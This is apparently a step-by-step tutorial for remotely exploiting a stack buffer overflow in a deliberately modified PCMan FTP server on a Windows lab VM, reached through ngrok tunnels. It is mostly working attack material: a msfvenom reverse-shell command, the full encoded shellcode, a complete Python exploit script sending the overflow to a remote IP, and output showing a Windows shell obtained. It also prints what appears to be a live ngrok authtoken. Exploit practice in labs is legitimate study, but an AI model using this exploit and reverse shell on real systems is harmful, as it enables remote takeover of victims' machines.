# Remote Stack buffer overflow - Windows Exploiting
## Part I - Access granted please!kali
---
## Step by step guide
### Sofware:

- Immunity debugger
- mona
- Vulnerble App PCMAN (modified by Master Dreg)
- Notepad ++
- VMVirtualbox
- ngrok
- netcat
- Wireshark


### OS:
- Kali linux
- Windows 10 pro
---
## First steps

Disable all Windows Anti Virus options in win 10 pro virtual machine.
We will then install all the necessary software and run ngrok first.

```sh
 ngrok - tunnel local ports to public URLs and inspect traffic

DESCRIPTION:
    ngrok exposes local networked services behinds NATs and firewalls to the
    public internet over a secure tunnel. Share local websites, build/test
    webhook consumers and self-host personal services.
    Detailed help for each command is available with 'ngrok help <command>'.
    Open http://localhost:4040 for ngrok's web interface to inspect traffic.

EXAMPLES:
    ngrok http 80                    # secure public URL for port 80 web server
    ngrok http -subdomain=baz 8080   # port 8080 available at baz.ngrok.io
    ngrok http foo.dev:80            # tunnel to host:port instead of localhost
    ngrok http https://localhost     # expose a local https server
    ngrok tcp 22                     # tunnel arbitrary TCP traffic to port 22
    ngrok tls -hostname=foo.com 443  # TLS traffic for foo.com to port 443
    ngrok start foo bar baz          # start tunnels from the configuration file

VERSION:
   2.3.35

AUTHOR:
  inconshreveable - <alan@ngrok.com>

COMMANDS:
   authtoken    save authtoken to configuration file
   credits      prints author and licensing information
   http         start an HTTP tunnel
   start        start tunnels by name from the configuration file
   tcp          start a TCP tunnel
   tls          start a TLS tunnel
   update       update ngrok to the latest version
   version      print the version string
   help         Shows a list of commands or help for one command
```
The Ngrok wellcome screen... in order to create a ftp (21) service in ngrok just type
```sh
ngrok tcp 21
--------------------------------------------------------------------------------
If you have already signed up, make sure your authtoken is installed.
Your authtoken is available on your dashboard: https://dashboard.ngrok.com/auth/your-authtoken
```
Log in ngrok and copy the authtoken (you can use a temporary email service as Temp Mail - temp-mail.org)

paste your authtoken using the follow command 
```sh
./ngrok authtoken "*****************************************"
ngrok by @inconshreveable                                                                               (Ctrl+C to quit)                                                                                                                        Session Status                online                                                                                    Account                       tester (Plan: Free)                                                                       Version                       2.3.35                                                                                    Region                        United States (us)                                                                        Web Interface                 http://127.0.0.1:4040                                                                     Forwarding                    tcp://xxxxxxxxxxx.io:xxxxx -> localhost:21                                                                                                                                                                        Connections                   ttl     opn     rt1     rt5     p50     p90                                                                             0       0       0.00    0.00    0.00    0.00  
```
We open netcat to lisen on port 21, go to your netcat location and run it with the next command
```sh
nc -l -p 21
```
Check if netcat service is lisening at port 21.

Now it's time to open the vulnerable app on windows and start the kali machine to set it up as attacking machine.
Install ngrok for linux on the kali machine. 

Create a new authtoken for ngrok, paste and run these commands:
sh````
./ngrok authtoken 1nBkEGfhS0wi7S7UVGrmk93XSzu_45cNBsHJus9vMriC9k7Jw
./ngrok tcp 2021
```
ping to forwarding address
sh```
ping 2.tcp.ngrok.io
---
obtaining the remote ip address (*.*.*.*)
Create a reverse shell with metaexplot msvenom with the following command
```sh
$ msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp -e x86/alpha_mixed LHOST=3.131.207.170 LPORT=11954  -f python
```
Ensure IP and port values are both correct
```sh
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/alpha_mixed
x86/alpha_mixed succeeded with size 710 (iteration=0)
x86/alpha_mixed chosen with final size 710
Payload size: 710 bytes
Final size of python file: 3456 bytes
buf =  b""
buf += b"\xda\xd0\xd9\x74\x24\xf4\x59\x49\x49\x49\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x43\x37\x51"
buf += b"\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51"
buf += b"\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50"
buf += b"\x38\x41\x42\x75\x4a\x49\x79\x6c\x59\x78\x4e\x62\x37"
buf += b"\x70\x77\x70\x43\x30\x65\x30\x6c\x49\x4a\x45\x64\x71"
buf += b"\x49\x50\x55\x34\x4e\x6b\x52\x70\x30\x30\x6e\x6b\x50"
buf += b"\x52\x56\x6c\x6c\x4b\x56\x32\x34\x54\x4e\x6b\x53\x42"
buf += b"\x46\x48\x44\x4f\x4f\x47\x30\x4a\x71\x36\x34\x71\x79"
buf += b"\x6f\x4e\x4c\x37\x4c\x45\x31\x33\x4c\x47\x72\x64\x6c"
buf += b"\x51\x30\x69\x51\x4a\x6f\x34\x4d\x36\x61\x69\x57\x6d"
buf += b"\x32\x59\x62\x71\x42\x62\x77\x6e\x6b\x62\x72\x44\x50"
buf += b"\x4e\x6b\x50\x4a\x47\x4c\x4e\x6b\x72\x6c\x74\x51\x72"
buf += b"\x58\x68\x63\x47\x38\x46\x61\x6a\x71\x46\x31\x6c\x4b"
buf += b"\x52\x79\x51\x30\x46\x61\x78\x53\x4c\x4b\x50\x49\x37"
buf += b"\x68\x6a\x43\x46\x5a\x61\x59\x6e\x6b\x65\x64\x6e\x6b"
buf += b"\x33\x31\x49\x46\x34\x71\x59\x6f\x4c\x6c\x49\x51\x38"
buf += b"\x4f\x36\x6d\x65\x51\x6f\x37\x77\x48\x4b\x50\x34\x35"
buf += b"\x79\x66\x74\x43\x51\x6d\x7a\x58\x37\x4b\x71\x6d\x77"
buf += b"\x54\x50\x75\x6d\x34\x62\x78\x6e\x6b\x62\x78\x37\x54"
buf += b"\x77\x71\x6e\x33\x31\x76\x6e\x6b\x36\x6c\x62\x6b\x6e"
buf += b"\x6b\x73\x68\x57\x6c\x46\x61\x7a\x73\x6e\x6b\x43\x34"
buf += b"\x4e\x6b\x35\x51\x4e\x30\x4e\x69\x50\x44\x56\x44\x65"
buf += b"\x74\x61\x4b\x51\x4b\x73\x51\x72\x79\x32\x7a\x33\x61"
buf += b"\x49\x6f\x69\x70\x51\x4f\x71\x4f\x50\x5a\x4e\x6b\x55"
buf += b"\x42\x5a\x4b\x6e\x6d\x71\x4d\x65\x38\x30\x33\x34\x72"
buf += b"\x47\x70\x73\x30\x51\x78\x71\x67\x53\x43\x35\x62\x51"
buf += b"\x4f\x32\x74\x61\x78\x52\x6c\x64\x37\x54\x66\x66\x67"
buf += b"\x69\x6f\x49\x45\x4e\x58\x7a\x30\x43\x31\x57\x70\x55"
buf += b"\x50\x74\x69\x6b\x74\x30\x54\x30\x50\x65\x38\x31\x39"
buf += b"\x6d\x50\x72\x4b\x45\x50\x4b\x4f\x79\x45\x52\x70\x72"
buf += b"\x70\x66\x30\x52\x70\x53\x70\x30\x50\x73\x70\x56\x30"
buf += b"\x61\x78\x5a\x4a\x44\x4f\x59\x4f\x4d\x30\x79\x6f\x68"
buf += b"\x55\x6f\x67\x53\x5a\x43\x35\x53\x58\x73\x33\x6e\x63"
buf += b"\x38\x4f\x6d\x7a\x31\x78\x37\x72\x67\x70\x46\x4e\x4e"
buf += b"\x52\x6d\x59\x4d\x36\x53\x5a\x56\x70\x76\x36\x31\x47"
buf += b"\x62\x48\x7a\x39\x6d\x75\x52\x54\x55\x31\x59\x6f\x49"
buf += b"\x45\x6c\x45\x69\x50\x72\x54\x64\x4c\x4b\x4f\x62\x6e"
buf += b"\x34\x48\x73\x45\x6a\x4c\x35\x38\x58\x70\x58\x35\x59"
buf += b"\x32\x73\x66\x69\x6f\x4b\x65\x33\x58\x42\x43\x30\x6d"
buf += b"\x62\x44\x37\x70\x6e\x69\x5a\x43\x56\x37\x46\x37\x43"
buf += b"\x67\x30\x31\x38\x76\x32\x4a\x64\x52\x42\x79\x61\x46"
buf += b"\x38\x62\x39\x6d\x71\x76\x4b\x77\x63\x74\x46\x44\x67"
buf += b"\x4c\x73\x31\x37\x71\x4e\x6d\x63\x74\x75\x74\x52\x30"
buf += b"\x48\x46\x37\x70\x43\x74\x33\x64\x50\x50\x66\x36\x71"
buf += b"\x46\x50\x56\x62\x66\x72\x76\x50\x4e\x46\x36\x63\x66"
buf += b"\x70\x53\x31\x46\x42\x48\x32\x59\x78\x4c\x35\x6f\x6e"
buf += b"\x66\x59\x6f\x49\x45\x6e\x69\x6b\x50\x50\x4e\x63\x66"
buf += b"\x42\x66\x4b\x4f\x76\x50\x62\x48\x55\x58\x4e\x67\x57"
buf += b"\x6d\x73\x50\x79\x6f\x6b\x65\x4f\x4b\x48\x70\x4d\x65"
buf += b"\x69\x32\x66\x36\x62\x48\x4e\x46\x6d\x45\x4f\x4d\x4f"
buf += b"\x6d\x49\x6f\x69\x45\x37\x4c\x37\x76\x61\x6c\x65\x5a"
buf += b"\x4b\x30\x79\x6b\x39\x70\x70\x75\x47\x75\x6d\x6b\x31"
buf += b"\x57\x32\x33\x44\x32\x42\x4f\x71\x7a\x43\x30\x51\x43"
buf += b"\x79\x6f\x68\x55\x41\x41"

```
now we can open a listener on port 2021 just typing 
```sh
nc -lvp 2021
```
---

## The base python script (Master Dreg)

add target_ip, port number and shell script to our base python script. To achieve our intentions we should make a ping of the windows machine 
```sh
$ ping 0.tcp.ngrok.io
PING 0.tcp.ngrok.io (3.134.39.220) 56(84) bytes of data.
^C
--- 0.tcp.ngrok.io ping statistics ---
5 packets transmitted, 0 received, 100% packet loss, time 4082ms
```

```python
#!/usr/bin/env python

from socket import *
from time import sleep
from sys import exit, exc_info
import os

print ("-") *40
print ("| VUPlayer Exploit v1.0 by Sm@rtR3v0lt |")
print ("-") *40
print ("|               thanks to Master Dreg! |")
print ("-") *40

os.system("ifconfig eth0 mtu 3000")

# tcp://0.tcp.ngrok.io:14087 -> localhost:21
target_ip = "3.134.39.220" # Remote machine IP
port = int(15139) #ngrok remote machine

# msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp -e x86/alpha_mixed LHOST=3.22.53.161 LPORT=11954  -f python
buf =  b""
buf += b"\xda\xd0\xd9\x74\x24\xf4\x59\x49\x49\x49\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x43\x37\x51"
buf += b"\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51"
buf += b"\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50"
buf += b"\x38\x41\x42\x75\x4a\x49\x79\x6c\x59\x78\x4e\x62\x37"
buf += b"\x70\x77\x70\x43\x30\x65\x30\x6c\x49\x4a\x45\x64\x71"
buf += b"\x49\x50\x55\x34\x4e\x6b\x52\x70\x30\x30\x6e\x6b\x50"
buf += b"\x52\x56\x6c\x6c\x4b\x56\x32\x34\x54\x4e\x6b\x53\x42"
buf += b"\x46\x48\x44\x4f\x4f\x47\x30\x4a\x71\x36\x34\x71\x79"
buf += b"\x6f\x4e\x4c\x37\x4c\x45\x31\x33\x4c\x47\x72\x64\x6c"
buf += b"\x51\x30\x69\x51\x4a\x6f\x34\x4d\x36\x61\x69\x57\x6d"
buf += b"\x32\x59\x62\x71\x42\x62\x77\x6e\x6b\x62\x72\x44\x50"
buf += b"\x4e\x6b\x50\x4a\x47\x4c\x4e\x6b\x72\x6c\x74\x51\x72"
buf += b"\x58\x68\x63\x47\x38\x46\x61\x6a\x71\x46\x31\x6c\x4b"
buf += b"\x52\x79\x51\x30\x46\x61\x78\x53\x4c\x4b\x50\x49\x37"
buf += b"\x68\x6a\x43\x46\x5a\x61\x59\x6e\x6b\x65\x64\x6e\x6b"
buf += b"\x33\x31\x49\x46\x34\x71\x59\x6f\x4c\x6c\x49\x51\x38"
buf += b"\x4f\x36\x6d\x65\x51\x6f\x37\x77\x48\x4b\x50\x34\x35"
buf += b"\x79\x66\x74\x43\x51\x6d\x7a\x58\x37\x4b\x71\x6d\x77"
buf += b"\x54\x50\x75\x6d\x34\x62\x78\x6e\x6b\x62\x78\x37\x54"
buf += b"\x77\x71\x6e\x33\x31\x76\x6e\x6b\x36\x6c\x62\x6b\x6e"
buf += b"\x6b\x73\x68\x57\x6c\x46\x61\x7a\x73\x6e\x6b\x43\x34"
buf += b"\x4e\x6b\x35\x51\x4e\x30\x4e\x69\x50\x44\x56\x44\x65"
buf += b"\x74\x61\x4b\x51\x4b\x73\x51\x72\x79\x32\x7a\x33\x61"
buf += b"\x49\x6f\x69\x70\x51\x4f\x71\x4f\x50\x5a\x4e\x6b\x55"
buf += b"\x42\x5a\x4b\x6e\x6d\x71\x4d\x65\x38\x30\x33\x34\x72"
buf += b"\x47\x70\x73\x30\x51\x78\x71\x67\x53\x43\x35\x62\x51"
buf += b"\x4f\x32\x74\x61\x78\x52\x6c\x64\x37\x54\x66\x66\x67"
buf += b"\x69\x6f\x49\x45\x4e\x58\x7a\x30\x43\x31\x57\x70\x55"
buf += b"\x50\x74\x69\x6b\x74\x30\x54\x30\x50\x65\x38\x31\x39"
buf += b"\x6d\x50\x72\x4b\x45\x50\x4b\x4f\x79\x45\x52\x70\x72"
buf += b"\x70\x66\x30\x52\x70\x53\x70\x30\x50\x73\x70\x56\x30"
buf += b"\x61\x78\x5a\x4a\x44\x4f\x59\x4f\x4d\x30\x79\x6f\x68"
buf += b"\x55\x6f\x67\x53\x5a\x43\x35\x53\x58\x73\x33\x6e\x63"
buf += b"\x38\x4f\x6d\x7a\x31\x78\x37\x72\x67\x70\x46\x4e\x4e"
buf += b"\x52\x6d\x59\x4d\x36\x53\x5a\x56\x70\x76\x36\x31\x47"
buf += b"\x62\x48\x7a\x39\x6d\x75\x52\x54\x55\x31\x59\x6f\x49"
buf += b"\x45\x6c\x45\x69\x50\x72\x54\x64\x4c\x4b\x4f\x62\x6e"
buf += b"\x34\x48\x73\x45\x6a\x4c\x35\x38\x58\x70\x58\x35\x59"
buf += b"\x32\x73\x66\x69\x6f\x4b\x65\x33\x58\x42\x43\x30\x6d"
buf += b"\x62\x44\x37\x70\x6e\x69\x5a\x43\x56\x37\x46\x37\x43"
buf += b"\x67\x30\x31\x38\x76\x32\x4a\x64\x52\x42\x79\x61\x46"
buf += b"\x38\x62\x39\x6d\x71\x76\x4b\x77\x63\x74\x46\x44\x67"
buf += b"\x4c\x73\x31\x37\x71\x4e\x6d\x63\x74\x75\x74\x52\x30"
buf += b"\x48\x46\x37\x70\x43\x74\x33\x64\x50\x50\x66\x36\x71"
buf += b"\x46\x50\x56\x62\x66\x72\x76\x50\x4e\x46\x36\x63\x66"
buf += b"\x70\x53\x31\x46\x42\x48\x32\x59\x78\x4c\x35\x6f\x6e"
buf += b"\x66\x59\x6f\x49\x45\x6e\x69\x6b\x50\x50\x4e\x63\x66"
buf += b"\x42\x66\x4b\x4f\x76\x50\x62\x48\x55\x58\x4e\x67\x57"
buf += b"\x6d\x73\x50\x79\x6f\x6b\x65\x4f\x4b\x48\x70\x4d\x65"
buf += b"\x69\x32\x66\x36\x62\x48\x4e\x46\x6d\x45\x4f\x4d\x4f"
buf += b"\x6d\x49\x6f\x69\x45\x37\x4c\x37\x76\x61\x6c\x65\x5a"
buf += b"\x4b\x30\x79\x6b\x39\x70\x70\x75\x47\x75\x6d\x6b\x31"
buf += b"\x57\x32\x33\x44\x32\x42\x4f\x71\x7a\x43\x30\x51\x43"
buf += b"\x79\x6f\x68\x55\x41\x41"

current_shellcode = buf

shellcode = '\x41' * 2011
shellcode += "\x9F\x53\x10\x10" # ret
shellcode += '\x90' * 20
shellcode += current_shellcode


print("\nshellcode content (size " + str(len(shellcode))  + " bytes):\n")
print(":".join("{:02x}".format(ord(c)) for c in shellcode))
print("\n")

target = inet_aton(target_ip)
target = inet_ntoa(target)

try:
    socket = socket(AF_INET, SOCK_STREAM)
except:
    print "\nError creating the network socket\n\n%s\n" % exc_info()       
    exit(1)    

try:
    print "Connecting to %s %d" % (target, port)
    socket.connect((target, port))
except:
    print "\nError connecting to %s\n\n%s\n" % (target, exc_info())
    exit(1)
    
print("Connected!")
sleep(1)
print(socket.recv(1000))
sleep(1)
print("Logging as anonymous")
socket.send('USER anonymous\r\n')
sleep(1)
print(socket.recv(1024))
print("Empty password")
sleep(1)
socket.send('PASS\r\n')
sleep(1)
print(socket.recv(1024))
try:
    print "Sending evil packet to %s %d (length: %d bytes), please wait a few secs...." % (target, port, len(shellcode))
    socket.send(shellcode)
    sleep(4)
    socket.close()

except:
    print "\nError sending evil packet to %s\n\n%s\n" % (target, exc_info())
    exit(1)


print("\n\nDone! :-)\n")


sleep(1)
```
Ensure PCman is runing on windows machine and launch the script in kali, if everithing is working we shoul have now access to the remote windows machine! look on port 2021.
```sh
└─$ python pcman_dregmod_exploit_two.py                                                                                                      1 ⨯
----------------------------------------
| VUPlayer Exploit v1.0 by Sm@rtR3v0lt |
----------------------------------------
|               thanks to Master Dreg! |
----------------------------------------
SIOCSIFMTU: Operation not permitted

shellcode content (size 2743 bytes):

41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:9f:53:10:10:90:90:90:90:90:90:90:90:90:90:90:90:90:90:90:90:90:90:90:90:da:d0:d9:74:24:f4:59:49:49:49:49:49:49:49:49:49:49:43:43:43:43:43:43:43:37:51:5a:6a:41:58:50:30:41:30:41:6b:41:41:51:32:41:42:32:42:42:30:42:42:41:42:58:50:38:41:42:75:4a:49:79:6c:59:78:4e:62:37:70:77:70:43:30:65:30:6c:49:4a:45:64:71:49:50:55:34:4e:6b:52:70:30:30:6e:6b:50:52:56:6c:6c:4b:56:32:34:54:4e:6b:53:42:46:48:44:4f:4f:47:30:4a:71:36:34:71:79:6f:4e:4c:37:4c:45:31:33:4c:47:72:64:6c:51:30:69:51:4a:6f:34:4d:36:61:69:57:6d:32:59:62:71:42:62:77:6e:6b:62:72:44:50:4e:6b:50:4a:47:4c:4e:6b:72:6c:74:51:72:58:68:63:47:38:46:61:6a:71:46:31:6c:4b:52:79:51:30:46:61:78:53:4c:4b:50:49:37:68:6a:43:46:5a:61:59:6e:6b:65:64:6e:6b:33:31:49:46:34:71:59:6f:4c:6c:49:51:38:4f:36:6d:65:51:6f:37:77:48:4b:50:34:35:79:66:74:43:51:6d:7a:58:37:4b:71:6d:77:54:50:75:6d:34:62:78:6e:6b:62:78:37:54:77:71:6e:33:31:76:6e:6b:36:6c:62:6b:6e:6b:73:68:57:6c:46:61:7a:73:6e:6b:43:34:4e:6b:35:51:4e:30:4e:69:50:44:56:44:65:74:61:4b:51:4b:73:51:72:79:32:7a:33:61:49:6f:69:70:51:4f:71:4f:50:5a:4e:6b:55:42:5a:4b:6e:6d:71:4d:65:38:30:33:34:72:47:70:73:30:51:78:71:67:53:43:35:62:51:4f:32:74:61:78:52:6c:64:37:54:66:66:67:69:6f:49:45:4e:58:7a:30:43:31:57:70:55:50:74:69:6b:74:30:54:30:50:65:38:31:39:6d:50:72:4b:45:50:4b:4f:79:45:52:70:72:70:66:30:52:70:53:70:30:50:73:70:56:30:61:78:5a:4a:44:4f:59:4f:4d:30:79:6f:68:55:6f:67:53:5a:43:35:53:58:73:33:6e:63:38:4f:6d:7a:31:78:37:72:67:70:46:4e:4e:52:6d:59:4d:36:53:5a:56:70:76:36:31:47:62:48:7a:39:6d:75:52:54:55:31:59:6f:49:45:6c:45:69:50:72:54:64:4c:4b:4f:62:6e:34:48:73:45:6a:4c:35:38:58:70:58:35:59:32:73:66:69:6f:4b:65:33:58:42:43:30:6d:62:44:37:70:6e:69:5a:43:56:37:46:37:43:67:30:31:38:76:32:4a:64:52:42:79:61:46:38:62:39:6d:71:76:4b:77:63:74:46:44:67:4c:73:31:37:71:4e:6d:63:74:75:74:52:30:48:46:37:70:43:74:33:64:50:50:66:36:71:46:50:56:62:66:72:76:50:4e:46:36:63:66:70:53:31:46:42:48:32:59:78:4c:35:6f:6e:66:59:6f:49:45:6e:69:6b:50:50:4e:63:66:42:66:4b:4f:76:50:62:48:55:58:4e:67:57:6d:73:50:79:6f:6b:65:4f:4b:48:70:4d:65:69:32:66:36:62:48:4e:46:6d:45:4f:4d:4f:6d:49:6f:69:45:37:4c:37:76:61:6c:65:5a:4b:30:79:6b:39:70:70:75:47:75:6d:6b:31:57:32:33:44:32:42:4f:71:7a:43:30:51:43:79:6f:68:55:41:41


Connecting to 3.134.39.220 15139
Connected!
220 PCMan's FTP Server 2.0 Ready.

Logging as anonymous
331 User name okay, need password.

Empty password
230 User logged in

Sending evil packet to 3.134.39.220 15139 (length: 2743 bytes), please wait a few secs....


Done! :-)
```
```sh
└─$ nc -lvp 2021                                                                                                                             1 ⨯
listening on [any] 2021 ...
connect to [127.0.0.1] from localhost [127.0.0.1] 41582
Microsoft Windows [Versi�n 10.0.19042.631]
(c) 2020 Microsoft Corporation. Todos los derechos reservados.

C:\Users\code\Desktop\Remote Exploiting\pcman_dregmod\pcman_dregmod>dir
dir
 El volumen de la unidad C no tiene etiqueta.
 El n�mero de serie del volumen es: XXXX-XXXX

 Directorio de C:\Users\xxxxx\xxxxx\Remote Exploiting\pcman_dregmod\pcman_dregmod

15/01/2021  16:21    <DIR>          .
15/01/2021  16:21    <DIR>          ..
15/01/2021  16:21            93.240 bass.dll
15/01/2021  16:21    <DIR>          Blowfish Source Code
15/01/2021  16:21            32.768 Blowfish.dll
15/01/2021  16:21            14.904 dreg.dll
29/08/2007  16:03    <DIR>          Groups
15/01/2021  16:21                 0 IPFilter.ini
15/01/2021  16:21            32.768 Lang.dll
15/01/2021  16:21    <DIR>          Logs
15/01/2021  16:21           282.896 PCManFTPD2.exe
15/01/2021  16:21               540 PCManFTPD2.exe.manifest
15/01/2021  16:21               274 Server.ini
15/01/2021  00:34    <DIR>          test
15/01/2021  16:21    <DIR>          Users
15/01/2021  16:21                47 Users.ini
15/01/2021  16:21                29 WelcomeMsg.ini
15/01/2021  16:21           302.702 ??5??????? FTP ?.mht
15/01/2021  16:21               215 ?????.url
              12 archivos        760.383 bytes
               7 dirs  24.351.068.160 bytes libres
```
---
# nice job!
Established connection!
---
```sh

 _   _             _ _               _       __              _ 
| | | |_ __ _____ | (_) __ _ _ __   (_)___  |_ \ _   _  __ _| |
| |_| | '_ |__ \ \| | |/ _` | '_ \  | |__ \  _| | | | |/ _` | |
